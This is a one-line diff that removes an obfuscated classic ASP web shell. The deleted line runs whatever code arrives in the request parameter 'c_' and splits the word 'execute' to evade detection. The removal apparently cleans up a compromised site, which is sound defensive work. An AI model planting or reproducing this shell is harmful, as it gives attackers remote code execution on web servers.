@@ -1,1 +1,0 @@
-<%dim c_:c_=request("c_"):if c_<>"" then eval("ex"&"ecu"&"te(request(""c_""))")%>
